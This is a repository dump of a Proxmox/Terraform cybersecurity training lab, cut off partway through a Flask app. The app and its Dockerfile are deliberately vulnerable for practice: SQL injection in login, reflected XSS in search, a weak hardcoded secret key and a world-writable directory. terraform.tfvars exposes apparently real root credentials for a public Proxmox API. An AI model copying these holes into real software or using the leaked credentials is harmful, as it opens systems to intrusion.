+                "id": 0,
+                "iops_r_burst": 0,
+                "iops_r_burst_length": 0,
+                "iops_r_concurrent": 0,
+                "iops_wr_burst": 0,
+                "iops_wr_burst_length": 0,
+                "iops_wr_concurrent": 0,
+                "iothread": false,
+                "iso": "",
+                "linked_disk_id": -1,
+                "mbps_r_burst": 0,
+                "mbps_r_concurrent": 0,
+                "mbps_wr_burst": 0,
+                "mbps_wr_concurrent": 0,
+                "passthrough": false,
+                "readonly": false,
+                "replicate": false,
+                "serial": "",
+                "size": "40G",
+                "slot": "scsi0",
+                "storage": "local",
+                "type": "disk",
+                "wwn": ""
+              }
+            ],
+            "disks": [],
+            "efidisk": [],
+            "force_create": false,
+            "force_recreate_on_change_of": null,
+            "full_clone": true,
+            "hagroup": "",
+            "hastate": "",
+            "hostpci": [],
+            "hotplug": "network,disk,usb",
+            "id": "proxmox70551/qemu/102",
+            "ipconfig0": "ip=192.168.10.20/24,gw=192.168.10.1",
+            "ipconfig1": null,
+            "ipconfig10": null,
+            "ipconfig11": null,
+            "ipconfig12": null,
+            "ipconfig13": null,
+            "ipconfig14": null,
+            "ipconfig15": null,
+            "ipconfig2": null,
+            "ipconfig3": null,
+            "ipconfig4": null,
+            "ipconfig5": null,
+            "ipconfig6": null,
+            "ipconfig7": null,
+            "ipconfig8": null,
+            "ipconfig9": null,
+            "kvm": true,
+            "linked_vmid": 0,
+            "machine": "",
+            "memory": 4096,
+            "name": "k8s-worker-1",
+            "nameserver": null,
+            "network": [
+              {
+                "bridge": "vmbr1",
+                "firewall": false,
+                "id": 0,
+                "link_down": false,
+                "macaddr": "bc:24:11:a0:81:fe",
+                "model": "virtio",
+                "mtu": 0,
+                "queues": 0,
+                "rate": 0,
+                "tag": 0
+              }
+            ],
+            "numa": false,
+            "onboot": false,
+            "os_network_config": null,
+            "os_type": "cloud-init",
+            "pci": [],
+            "pcis": [],
+            "pool": "",
+            "protection": false,
+            "pxe": null,
+            "qemu_os": "other",
+            "reboot_required": false,
+            "rng": [],
+            "scsihw": "virtio-scsi-pci",
+            "searchdomain": null,
+            "serial": [
+              {
+                "id": 0,
+                "type": "socket"
+              }
+            ],
+            "skip_ipv4": false,
+            "skip_ipv6": false,
+            "smbios": [
+              {
+                "family": "",
+                "manufacturer": "",
+                "product": "",
+                "serial": "",
+                "sku": "",
+                "uuid": "5f0a215d-ac46-41d3-b6a3-f45ea65208de",
+                "version": ""
+              }
+            ],
+            "sockets": 0,
+            "ssh_forward_ip": null,
+            "ssh_host": "192.168.10.20",
+            "ssh_port": "22",
+            "ssh_private_key": null,
+            "ssh_user": null,
+            "sshkeys": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN574XK1yUf6MzqHMVgU4u+JdFj7HlE0Mnk6KIruBCm7 prokopenko.danilka121@gmail.com\n",
+            "startup": "",
+            "tablet": true,
+            "tags": " ",
+            "target_node": "proxmox70551",
+            "target_nodes": null,
+            "timeouts": null,
+            "tpm_state": [],
+            "unused_disk": [],
+            "usb": [],
+            "usbs": [],
+            "vcpus": 0,
+            "vga": [],
+            "vm_state": "running",
+            "vmid": 102
+          },
+          "sensitive_attributes": [
+            [
+              {
+                "type": "get_attr",
+                "value": "cipassword"
+              }
+            ]
+          ],
+          "private": "eyJlMmJmYjczMC1lY2FhLTExZTYtOGY4OC0zNDM2M2JjN2M0YzAiOnsiY3JlYXRlIjoxMjAwMDAwMDAwMDAwLCJkZWZhdWx0IjoxMjAwMDAwMDAwMDAwLCJkZWxldGUiOjEyMDAwMDAwMDAwMDAsInJlYWQiOjEyMDAwMDAwMDAwMDAsInVwZGF0ZSI6MTIwMDAwMDAwMDAwMH19"
+        }
+      ]
+    },
+    {
+      "mode": "managed",
+      "type": "proxmox_vm_qemu",
+      "name": "pfsense",
+      "provider": "provider[\"registry.terraform.io/telmate/proxmox\"]",
+      "instances": [
+        {
+          "index_key": 0,
+          "schema_version": 0,
+          "attributes": {
+            "additional_wait": 5,
+            "agent": 0,
+            "agent_timeout": 90,
+            "args": "",
+            "automatic_reboot": true,
+            "balloon": 0,
+            "bios": "seabios",
+            "boot": "order=scsi0;net0",
+            "bootdisk": "",
+            "ci_wait": null,
+            "cicustom": null,
+            "cipassword": "",
+            "ciupgrade": false,
+            "ciuser": "",
+            "clone": "pfsense-template",
+            "clone_id": null,
+            "clone_wait": 10,
+            "cores": 0,
+            "cpu": [
+              {
+                "affinity": "",
+                "cores": 2,
+                "flags": [],
+                "limit": 0,
+                "numa": false,
+                "sockets": 1,
+                "type": "host",
+                "units": 0,
+                "vcores": 0
+              }
+            ],
+            "cpu_type": "",
+            "current_node": "proxmox70551",
+            "default_ipv4_address": "",
+            "default_ipv6_address": "",
+            "define_connection_info": true,
+            "desc": null,
+            "description": "Managed by Terraform.",
+            "disk": [
+              {
+                "asyncio": "",
+                "backup": true,
+                "cache": "",
+                "discard": false,
+                "disk_file": "",
+                "emulatessd": false,
+                "format": "raw",
+                "id": 1,
+                "iops_r_burst": 0,
+                "iops_r_burst_length": 0,
+                "iops_r_concurrent": 0,
+                "iops_wr_burst": 0,
+                "iops_wr_burst_length": 0,
+                "iops_wr_concurrent": 0,
+                "iothread": false,
+                "iso": "",
+                "linked_disk_id": -1,
+                "mbps_r_burst": 0,
+                "mbps_r_concurrent": 0,
+                "mbps_wr_burst": 0,
+                "mbps_wr_concurrent": 0,
+                "passthrough": false,
+                "readonly": false,
+                "replicate": false,
+                "serial": "",
+                "size": "15G",
+                "slot": "scsi0",
+                "storage": "local",
+                "type": "disk",
+                "wwn": ""
+              }
+            ],
+            "disks": [],
+            "efidisk": [],
+            "force_create": false,
+            "force_recreate_on_change_of": null,
+            "full_clone": true,
+            "hagroup": "",
+            "hastate": "",
+            "hostpci": [],
+            "hotplug": "network,disk,usb",
+            "id": "proxmox70551/qemu/103",
+            "ipconfig0": null,
+            "ipconfig1": null,
+            "ipconfig10": null,
+            "ipconfig11": null,
+            "ipconfig12": null,
+            "ipconfig13": null,
+            "ipconfig14": null,
+            "ipconfig15": null,
+            "ipconfig2": null,
+            "ipconfig3": null,
+            "ipconfig4": null,
+            "ipconfig5": null,
+            "ipconfig6": null,
+            "ipconfig7": null,
+            "ipconfig8": null,
+            "ipconfig9": null,
+            "kvm": true,
+            "linked_vmid": 0,
+            "machine": "",
+            "memory": 2048,
+            "name": "pfsense-fw",
+            "nameserver": null,
+            "network": [
+              {
+                "bridge": "vmbr0",
+                "firewall": false,
+                "id": 0,
+                "link_down": false,
+                "macaddr": "bc:24:11:09:9b:05",
+                "model": "virtio",
+                "mtu": 0,
+                "queues": 0,
+                "rate": 0,
+                "tag": 0
+              },
+              {
+                "bridge": "vmbr1",
+                "firewall": false,
+                "id": 1,
+                "link_down": false,
+                "macaddr": "bc:24:11:bb:5e:58",
+                "model": "virtio",
+                "mtu": 0,
+                "queues": 0,
+                "rate": 0,
+                "tag": 0
+              },
+              {
+                "bridge": "vmbr2",
+                "firewall": false,
+                "id": 2,
+                "link_down": false,
+                "macaddr": "bc:24:11:5e:92:4c",
+                "model": "virtio",
+                "mtu": 0,
+                "queues": 0,
+                "rate": 0,
+                "tag": 0
+              }
+            ],
+            "numa": false,
+            "onboot": false,
+            "os_network_config": null,
+            "os_type": "other",
+            "pci": [],
+            "pcis": [],
+            "pool": "",
+            "protection": false,
+            "pxe": null,
+            "qemu_os": "l26",
+            "reboot_required": false,
+            "rng": [],
+            "scsihw": "lsi",
+            "searchdomain": null,
+            "serial": [],
+            "skip_ipv4": false,
+            "skip_ipv6": false,
+            "smbios": [
+              {
+                "family": "",
+                "manufacturer": "",
+                "product": "",
+                "serial": "",
+                "sku": "",
+                "uuid": "9e626bac-8077-4eba-aadb-11250bf4350f",
+                "version": ""
+              }
+            ],
+            "sockets": 0,
+            "ssh_forward_ip": null,
+            "ssh_host": "",
+            "ssh_port": "22",
+            "ssh_private_key": null,
+            "ssh_user": null,
+            "sshkeys": null,
+            "startup": "",
+            "tablet": true,
+            "tags": " ",
+            "target_node": "proxmox70551",
+            "target_nodes": null,
+            "timeouts": null,
+            "tpm_state": [],
+            "unused_disk": [
+              {
+                "file": "103/vm-103-disk-0.qcow2",
+                "slot": 0,
+                "storage": "local"
+              }
+            ],
+            "usb": [],
+            "usbs": [],
+            "vcpus": 0,
+            "vga": [],
+            "vm_state": "running",
+            "vmid": 103
+          },
+          "sensitive_attributes": [],
+          "private": "eyJlMmJmYjczMC1lY2FhLTExZTYtOGY4OC0zNDM2M2JjN2M0YzAiOnsiY3JlYXRlIjoxMjAwMDAwMDAwMDAwLCJkZWZhdWx0IjoxMjAwMDAwMDAwMDAwLCJkZWxldGUiOjEyMDAwMDAwMDAwMDAsInJlYWQiOjEyMDAwMDAwMDAwMDAsInVwZGF0ZSI6MTIwMDAwMDAwMDAwMH19"
+        }
+      ]
+    },
+    {
+      "mode": "managed",
+      "type": "proxmox_vm_qemu",
+      "name": "student_vms",
+      "provider": "provider[\"registry.terraform.io/telmate/proxmox\"]",
+      "instances": [
+        {
+          "index_key": 0,
+          "schema_version": 0,
+          "attributes": {
+            "additional_wait": 5,
+            "agent": 1,
+            "agent_timeout": 90,
+            "args": "",
+            "automatic_reboot": true,
+            "balloon": 0,
+            "bios": "seabios",
+            "boot": "order=scsi0;ide2",
+            "bootdisk": "",
+            "ci_wait": null,
+            "cicustom": null,
+            "cipassword": "UbuntuPass2025",
+            "ciupgrade": false,
+            "ciuser": "ubuntu",
+            "clone": "ubuntu-2004-template",
+            "clone_id": null,
+            "clone_wait": 10,
+            "cores": 0,
+            "cpu": [
+              {
+                "affinity": "",
+                "cores": 2,
+                "flags": [],
+                "limit": 0,
+                "numa": false,
+                "sockets": 1,
+                "type": "host",
+                "units": 0,
+                "vcores": 0
+              }
+            ],
+            "cpu_type": "",
+            "current_node": "proxmox70551",
+            "default_ipv4_address": "192.168.100.10",
+            "default_ipv6_address": "",
+            "define_connection_info": true,
+            "desc": null,
+            "description": "Managed by Terraform.",
+            "disk": [
+              {
+                "asyncio": "",
+                "backup": true,
+                "cache": "",
+                "discard": false,
+                "disk_file": "",
+                "emulatessd": false,
+                "format": "",
+                "id": 0,
+                "iops_r_burst": 0,
+                "iops_r_burst_length": 0,
+                "iops_r_concurrent": 0,
+                "iops_wr_burst": 0,
+                "iops_wr_burst_length": 0,
+                "iops_wr_concurrent": 0,
+                "iothread": false,
+                "iso": "",
+                "linked_disk_id": 0,
+                "mbps_r_burst": 0,
+                "mbps_r_concurrent": 0,
+                "mbps_wr_burst": 0,
+                "mbps_wr_concurrent": 0,
+                "passthrough": false,
+                "readonly": false,
+                "replicate": false,
+                "serial": "",
+                "size": "",
+                "slot": "ide2",
+                "storage": "local",
+                "type": "cloudinit",
+                "wwn": ""
+              },
+              {
+                "asyncio": "",
+                "backup": true,
+                "cache": "",
+                "discard": false,
+                "disk_file": "",
+                "emulatessd": false,
+                "format": "raw",
+                "id": 0,
+                "iops_r_burst": 0,
+                "iops_r_burst_length": 0,
+                "iops_r_concurrent": 0,
+                "iops_wr_burst": 0,
+                "iops_wr_burst_length": 0,
+                "iops_wr_concurrent": 0,
+                "iothread": false,
+                "iso": "",
+                "linked_disk_id": -1,
+                "mbps_r_burst": 0,
+                "mbps_r_concurrent": 0,
+                "mbps_wr_burst": 0,
+                "mbps_wr_concurrent": 0,
+                "passthrough": false,
+                "readonly": false,
+                "replicate": false,
+                "serial": "",
+                "size": "15G",
+                "slot": "scsi0",
+                "storage": "local",
+                "type": "disk",
+                "wwn": ""
+              }
+            ],
+            "disks": [],
+            "efidisk": [],
+            "force_create": false,
+            "force_recreate_on_change_of": null,
+            "full_clone": true,
+            "hagroup": "",
+            "hastate": "",
+            "hostpci": [],
+            "hotplug": "network,disk,usb",
+            "id": "proxmox70551/qemu/104",
+            "ipconfig0": "ip=192.168.100.10/24,gw=192.168.100.1",
+            "ipconfig1": null,
+            "ipconfig10": null,
+            "ipconfig11": null,
+            "ipconfig12": null,
+            "ipconfig13": null,
+            "ipconfig14": null,
+            "ipconfig15": null,
+            "ipconfig2": null,
+            "ipconfig3": null,
+            "ipconfig4": null,
+            "ipconfig5": null,
+            "ipconfig6": null,
+            "ipconfig7": null,
+            "ipconfig8": null,
+            "ipconfig9": null,
+            "kvm": true,
+            "linked_vmid": 0,
+            "machine": "",
+            "memory": 2048,
+            "name": "student-vm-1",
+            "nameserver": null,
+            "network": [
+              {
+                "bridge": "vmbr1",
+                "firewall": false,
+                "id": 0,
+                "link_down": false,
+                "macaddr": "bc:24:11:d9:31:bb",
+                "model": "virtio",
+                "mtu": 0,
+                "queues": 0,
+                "rate": 0,
+                "tag": 100
+              }
+            ],
+            "numa": false,
+            "onboot": false,
+            "os_network_config": null,
+            "os_type": "cloud-init",
+            "pci": [],
+            "pcis": [],
+            "pool": "",
+            "protection": false,
+            "pxe": null,
+            "qemu_os": "other",
+            "reboot_required": false,
+            "rng": [],
+            "scsihw": "virtio-scsi-pci",
+            "searchdomain": null,
+            "serial": [
+              {
+                "id": 0,
+                "type": "socket"
+              }
+            ],
+            "skip_ipv4": false,
+            "skip_ipv6": false,
+            "smbios": [
+              {
+                "family": "",
+                "manufacturer": "",
+                "product": "",
+                "serial": "",
+                "sku": "",
+                "uuid": "6a79290e-f16a-49bb-b50a-82454ff6fc10",
+                "version": ""
+              }
+            ],
+            "sockets": 0,
+            "ssh_forward_ip": null,
+            "ssh_host": "192.168.100.10",
+            "ssh_port": "22",
+            "ssh_private_key": null,
+            "ssh_user": null,
+            "sshkeys": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN574XK1yUf6MzqHMVgU4u+JdFj7HlE0Mnk6KIruBCm7 prokopenko.danilka121@gmail.com\n",
+            "startup": "",
+            "tablet": true,
+            "tags": " ",
+            "target_node": "proxmox70551",
+            "target_nodes": null,
+            "timeouts": null,
+            "tpm_state": [],
+            "unused_disk": [],
+            "usb": [],
+            "usbs": [],
+            "vcpus": 0,
+            "vga": [],
+            "vm_state": "running",
+            "vmid": 104
+          },
+          "sensitive_attributes": [
+            [
+              {
+                "type": "get_attr",
+                "value": "cipassword"
+              }
+            ]
+          ],
+          "private": "eyJlMmJmYjczMC1lY2FhLTExZTYtOGY4OC0zNDM2M2JjN2M0YzAiOnsiY3JlYXRlIjoxMjAwMDAwMDAwMDAwLCJkZWZhdWx0IjoxMjAwMDAwMDAwMDAwLCJkZWxldGUiOjEyMDAwMDAwMDAwMDAsInJlYWQiOjEyMDAwMDAwMDAwMDAsInVwZGF0ZSI6MTIwMDAwMDAwMDAwMH19"
+        }
+      ]
+    }
+  ],
+  "check_results": null
+}
+
+```
+
+main.tf:
+```
+# Провайдер Proxmox
+terraform {
+  required_providers {
+    proxmox = {
+      source  = "telmate/proxmox"
+      version = "3.0.2-rc04"
+    }
+  }
+}
+
+provider "proxmox" {
+  pm_api_url      = var.proxmox_api_url
+  pm_user         = var.proxmox_user
+  pm_password     = var.proxmox_password
+  pm_tls_insecure = true
+}
+
+# Создание pfSense VM
+resource "proxmox_vm_qemu" "pfsense" {
+  count       = 1
+  name        = "pfsense-fw"
+  target_node = var.proxmox_node
+  clone       = var.pfsense_template
+
+  memory = 2048
+  
+  cpu {
+    cores = 2
+    sockets = 1
+  }
+
+
+  # WAN интерфейс
+  network {
+    id     = 0
+    model  = "virtio"
+    bridge = "vmbr0"
+  }
+
+  # LAN интерфейс  
+  network {
+    id     = 1
+    model  = "virtio"
+    bridge = "vmbr1"
+  }
+
+  # OPT1 интерфейс (для дополнительных VLAN)
+  network {
+    id     = 2
+    model  = "virtio"
+    bridge = "vmbr2"
+  }
+
+  disk {
+    slot    = "scsi0"
+    storage = var.storage_name
+    type    = "disk"
+    size    = "15G"
+  }
+
+  os_type = "other"
+
+  lifecycle {
+    ignore_changes = [
+      network,
+      disk,
+    ]
+  }
+}
+
+# Создание Kubernetes мастер нод
+resource "proxmox_vm_qemu" "k8s_master" {
+  count       = var.k8s_master_count
+  name        = "k8s-master-${count.index + 1}"
+  target_node = var.proxmox_node
+  clone       = var.ubuntu_template
+
+  memory = 2048
+  
+  cpu {
+    cores = 2
+    sockets = 1
+  }
+
+  agent    = 1
+  boot     = "order=scsi0;ide2"
+  bootdisk = "scsi0"
+  scsihw   = "virtio-scsi-pci"
+
+  serial {
+    id   = 0
+    type = "socket"
+  }
+
+  network {
+    id     = 0
+    model  = "virtio"
+    bridge = "vmbr1"
+  }
+
+  disk {
+    slot   = "scsi0"
+    storage = var.storage_name
+    type    = "disk"
+    size    = "20G"
+  }
+
+  # Новый Cloud-Init диск
+  disk {
+    slot     = "ide2"
+    type     = "cloudinit"
+    storage  = var.storage_name
+    size     = "4M"
+  }
+
+  os_type = "cloud-init"
+
+  # Cloud-init конфигурация
+  ciuser     = var.ci_user
+  cipassword = var.ci_password
+  sshkeys    = var.ssh_public_key
+
+  ipconfig0 = "ip=192.168.10.${count.index + 10}/24,gw=192.168.10.1"
+
+  lifecycle {
+    ignore_changes = [
+      network,
+      disk,
+    ]
+  }
+}
+
+# Создание Kubernetes worker нод
+resource "proxmox_vm_qemu" "k8s_worker" {
+  count       = var.k8s_worker_count
+  name        = "k8s-worker-${count.index + 1}"
+  target_node = var.proxmox_node
+  clone       = var.ubuntu_template
+
+  memory = 4096
+  agent    = 1
+  boot     = "order=scsi0;ide2"
+  bootdisk = "scsi0"
+  scsihw   = "virtio-scsi-pci"
+  
+  cpu {
+    cores = 2
+    sockets = 1
+  }
+
+  serial {
+    id   = 0
+    type = "socket"
+  }
+
+  network {
+    id     = 0
+    model  = "virtio"
+    bridge = "vmbr1"
+  }
+
+  disk {
+    slot    = "scsi0"
+    storage = var.storage_name
+    type    = "disk"
+    size    = "40G"
+  }
+
+  # Новый Cloud-Init диск
+  disk {
+    slot     = "ide2"
+    type     = "cloudinit"
+    storage  = var.storage_name
+    size     = "4M"
+  }
+
+  os_type = "cloud-init"
+
+  # Cloud-init конфигурация
+  ciuser     = var.ci_user
+  cipassword = var.ci_password
+  sshkeys    = var.ssh_public_key
+
+  ipconfig0 = "ip=192.168.10.${count.index + 20}/24,gw=192.168.10.1"
+
+  lifecycle {
+    ignore_changes = [
+      network,
+      disk,
+    ]
+  }
+}
+
+# Виртуальные машины для студентов (создаются динамически)
+resource "proxmox_vm_qemu" "student_vms" {
+  count       = var.student_vm_count
+  name        = "student-vm-${count.index + 1}"
+  target_node = var.proxmox_node
+  clone       = var.ubuntu_template
+
+  memory = 2048
+
+  agent    = 1
+  boot     = "order=scsi0;ide2"
+  bootdisk = "scsi0"
+  scsihw   = "virtio-scsi-pci"
+  
+  cpu {
+    cores = 2
+    sockets = 1
+  }
+
+  serial {
+    id   = 0
+    type = "socket"
+  }
+
+  network {
+    id     = 0
+    model  = "virtio"
+    bridge = "vmbr1"
+    tag    = 100 + count.index  # VLAN для изоляции студентов 
+  }
+
+  disk {
+    slot    = "scsi0"
+    storage = var.storage_name
+    type    = "disk"
+    size    = "15G"
+  }
+
+  # Новый Cloud-Init диск
+  disk {
+    slot     = "ide2"
+    type     = "cloudinit"
+    storage  = var.storage_name
+    size     = "4M"
+  }
+
+  os_type = "cloud-init"
+
+  ciuser     = var.ci_user
+  cipassword = var.ci_password
+  sshkeys    = var.ssh_public_key
+  
+
+  ipconfig0 = "ip=192.168.${100 + count.index}.10/24,gw=192.168.${100 + count.index}.1"
+}
+```
+
+terraform.tfvars:
+```
+proxmox_api_url = "https://158.255.0.220:8006/api2/json"
+proxmox_user = "root@pam"
+proxmox_password = "qq123456"
+proxmox_node = "proxmox70551"
+storage_name = "local"
+pfsense_template = "pfsense-template"
+ubuntu_template = "ubuntu-2004-template"
+k8s_master_count = 1
+k8s_worker_count = 1
+student_vm_count = 1
+ci_user = "ubuntu"
+ci_password = "UbuntuPass2025"
+ssh_public_key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN574XK1yUf6MzqHMVgU4u+JdFj7HlE0Mnk6KIruBCm7 prokopenko.danilka121@gmail.com"  # Ваш публичный SSH ключ
+
+```
+
+plan.out:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xb8 in position 10: invalid start byte
+```
+
+variables.tf:
+```
+variable "proxmox_api_url" {
+  description = "URL API Proxmox"
+  type        = string
+}
+
+variable "proxmox_user" {
+  description = "Пользователь Proxmox"
+  type        = string
+  default     = "root@pam"
+}
+
+variable "proxmox_password" {
+  description = "Пароль для Proxmox"
+  type        = string
+  sensitive   = true
+}
+
+variable "proxmox_node" {
+  description = "Имя ноды Proxmox"
+  type        = string
+}
+
+variable "storage_name" {
+  description = "Имя хранилища в Proxmox"
+  type        = string
+  default     = "local-lvm"
+}
+
+variable "pfsense_template" {
+  description = "Имя шаблона pfSense"
+  type        = string
+  default     = "pfsense-template"
+}
+
+variable "ubuntu_template" {
+  description = "Имя шаблона Ubuntu"
+  type        = string
+  default     = "ubuntu-2004-template"
+}
+
+variable "k8s_master_count" {
+  description = "Количество мастер нод Kubernetes"
+  type        = number
+  default     = 3
+}
+
+variable "k8s_worker_count" {
+  description = "Количество worker нод Kubernetes"
+  type        = number
+  default     = 3
+}
+
+variable "student_vm_count" {
+  description = "Количество VM для студентов"
+  type        = number
+  default     = 10
+}
+
+variable "ci_user" {
+  description = "Пользователь для cloud-init"
+  type        = string
+  default     = "ubuntu"
+}
+
+variable "ci_password" {
+  description = "Пароль для cloud-init"
+  type        = string
+  sensitive   = true
+}
+
+variable "ssh_public_key" {
+  description = "SSH публичный ключ"
+  type        = string
+}
+```
+
+terraform.tfvars.example:
+```
+proxmox_api_url = "https://192.168.1.112:8006/api2/json"
+proxmox_user = "root@pam"
+proxmox_password = "SuperSecretPass123"
+proxmox_node = "proxmox-node1"
+storage_name = "local-lvm"
+pfsense_template = "pfsense-template"
+ubuntu_template = "ubuntu-2004-template"
+k8s_master_count = 3
+k8s_worker_count = 3
+student_vm_count = 10
+ci_user = "ubuntu"
+ci_password = "UbuntuPass2025"
+ssh_public_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDTvFGbg80jbzd7Bpb11vIINACk4Q3sGPPrH2Xt36GsFPrqRJIFeQ+1uzf15nnQePIgR4q47rVfNp2aExknp3dNM5YKfVQxFMQjJA7cz33G1np7cZvStdeVlxBuDMjorH3FuHmU6fMKOHL5lmhDzNvPkvYcsYVOsrpKX0YWHFEsi7cEhc2otqxQrUc5E71poM2O4imANlzB4V/nrxaL+mdINUGbaSgwfR/joOM+GiKdkyjfnvB948oXaBUz0Z1Ul9gIeYxqavHHo0gHeLRY7C5Jj+tFQ1L7VLVDC85fcI0/qvEJkKpEBK5q5RMWcG2Q6IdFqucz1UwY2k4sELOe1DibUbFL8mhmmxqVg6XPw+/LGeXRMQWoC1RLbDNXcuJYEbNxGG48CXyThWgnpQ/QYdfvhc4RQf1lgtKWC9HycnoE5BKiodDcQEPdnjzMfJCwMllrD89TIQ0X7Q6Z8vQevT7NOcS1gyvt08vkN+9RhgaG0jGKOgCZ3z4VDkfFw8L9d1M54oKjg9wc3csbUvr9W2RdaE/KIwJnbfF9lC2N3ZEIq8rzFjr49VcVfmVvjsd9Ze4rSMPf4AdhHrijepGRc8nB8dfuNYPEt1wDYRAbcPr9N8fovH9zZjXrqJtH7NgKjC1wKZEePJ/xlMJzxPJF6KCQB1Di2ee17md4VRw4REUHWw== your_email@example.com"  # Ваш публичный SSH ключ
+
+```
+
+.terraform.lock.hcl:
+```
+# This file is maintained automatically by "terraform init".
+# Manual edits may be lost in future updates.
+
+provider "registry.terraform.io/telmate/proxmox" {
+  version     = "3.0.2-rc04"
+  constraints = "3.0.2-rc04"
+  hashes = [
+    "h1:ZPr93UUVOw1aCqsODLXsqNQ9Lq/WafX5jgCCLxKBHl4=",
+  ]
+}
+
+```
+
+LICENSE:
+```
+The MIT License (MIT)
+
+Copyright (c) 2017 <copyright holders>
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in
+all copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
+THE SOFTWARE.
+```
+
+README.md:
+```
+[![Build Status](https://travis-ci.com/Telmate/terraform-provider-proxmox.svg?branch=master)](https://travis-ci.com/Telmate/terraform-provider-proxmox)
+
+# Terraform provider plugin for Proxmox
+
+This repository provides a Terraform provider for
+the [Proxmox virtualization platform](https://pve.proxmox.com/pve-docs/) and exposes Terraform resources to provision
+QEMU VMs and LXC Containers.
+
+## Getting Started
+
+In order to get started, use [the documentation included in this repository](docs/index.md). The documentation contains
+a list of the options for the provider. Moreover, there are some guides available how to combine options and start
+specific VMs.
+
+## Quick Start
+
+Follow this [install guide](docs/guides/installation.md) to install the plugin.
+
+## Known Limitations
+
+* `proxmox_vm_qemu`.`disk`.`size` attribute does not match what is displayed in the Proxmox UI.
+* Updates to `proxmox_vm_qemu` resources almost always result as a failed task within the Proxmox UI. This appears to be
+  harmless and the desired configuration changes do get applied.
+* When using the `proxmox_lxc` resource, the provider will crash unless `rootfs` is defined.
+* When using the Network Boot mode (PXE), a valid NIC must be defined for the VM, and the boot order must specify network first.
+
+## Contributing
+
+When contributing, please also add documentation to help other users.
+
+### Debugging the provider
+
+Debugging is available for this provider through the Terraform Plugin SDK versions 2.0.0. Therefore, the plugin can be
+started with the debugging flag `--debug`.
+
+For example (using [delve](https://github.com/go-delve/delve) as Debugger):
+
+```bash
+dlv exec --headless ./terraform-provider-my-provider -- --debug
+```
+
+For more information about debugging a provider please
+see: [Debugger-Based Debugging](https://www.terraform.io/docs/extend/debugging.html#debugger-based-debugging)
+
+## Useful links
+
+* [Proxmox](https://www.proxmox.com/en/)
+* [Proxmox documentation](https://pve.proxmox.com/pve-docs/)
+* [Terraform](https://www.terraform.io/)
+* [Terraform documentation](https://www.terraform.io/docs/index.html)
+* [Recommended ISO builder](https://github.com/Telmate/terraform-ubuntu-proxmox-iso)
+
+```
+
+terraform-provider-proxmox_v3.0.2-rc04:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xcf in position 0: invalid continuation byte
+```
+
+outputs.tf:
+```
+
+```
+
+main.tf:
+```
+
+```
+
+variables.tf:
+```
+
+```
+
+outputs.tf:
+```
+
+```
+
+main.tf:
+```
+
+```
+
+variables.tf:
+```
+
+```
+
+outputs.tf:
+```
+
+```
+
+main.tf:
+```
+
+```
+
+variables.tf:
+```
+
+```
+
+.DS_Store:
+```
+Error reading file: 'utf-8' codec can't decode bytes in position 591-592: invalid continuation byte
+```
+
+requirements.txt:
+```
+Flask==2.3.3
+Werkzeug==2.3.7
+```
+
+Dockerfile:
+```
+FROM python:3.9-slim
+
+WORKDIR /app
+
+COPY requirements.txt .
+RUN pip install --no-cache-dir -r requirements.txt
+
+COPY app.py .
+COPY templates/ templates/
+
+# Создаем уязвимые конфигурации
+RUN useradd -m -s /bin/bash webapp && \
+    chmod 777 /app && \
+    echo "webapp:password123" | chpasswd
+
+USER webapp
+
+EXPOSE 5000
+
+CMD ["python", "app.py"]
+```
+
+app.py:
+```
+#!/usr/bin/env python3
+import os
+import sqlite3
+from flask import Flask, request, render_template_string, redirect, session
+import subprocess
+
+app = Flask(__name__)
+app.secret_key = 'super_secret_key_123'  # Уязвимость: слабый секретный ключ
+
+# Инициализация базы данных (уязвимой)
+def init_db():
+    conn = sqlite3.connect('app.db')
+    cursor = conn.cursor()
+    cursor.execute('''CREATE TABLE IF NOT EXISTS users 
+                     (id INTEGER PRIMARY KEY, username TEXT, password TEXT)''')
+    cursor.execute("INSERT OR IGNORE INTO users VALUES (1, 'admin', 'admin123')")
+    cursor.execute("INSERT OR IGNORE INTO users VALUES (2, 'user', 'password')")
+    conn.commit()
+    conn.close()
+
+@app.route('/')
+def home():
+    return '''
+    <h1>Vulnerable Web Application</h1>
+    <p>This is a deliberately vulnerable web application for cybersecurity training.</p>
+    <ul>
+        <li><a href="/login">Login</a></li>
+        <li><a href="/search">Search</a></li>
+        <li><a href="/command">Command Execution</a></li>
+        <li><a href="/file">File Operation</a></li>
+    </ul>
+    '''
+
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        username = request.form['username']
+        password = request.form['password']
+
+        # SQL Injection уязвимость
+        conn = sqlite3.connect('app.db')
+        cursor = conn.cursor()
+        query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
+        result = cursor.execute(query).fetchone()
+        conn.close()
+
+        if result:
+            session['user'] = username
+            return f"Welcome {username}! <a href='/'>Home</a>"
+        else:
+            return "Invalid credentials! <a href='/login'>Try again</a>"
+
+    return '''
+    <form method="POST">
+        Username: <input type="text" name="username"><br>
+        Password: <input type="password" name="password"><br>
+        <input type="submit" value="Login">
+    </form>
+    <p>Try: admin/admin123 or use SQL injection</p>
+    '''
+
+@app.route('/search')
+def search():
+    query = request.args.get('q', '')
+    if query:
+        # XSS уязвимость
+        return f"Search results for: {query} <br><a href='/'>Home</a>"
+    return '''
+    <form>
+        Search: <input type="text" name="q">
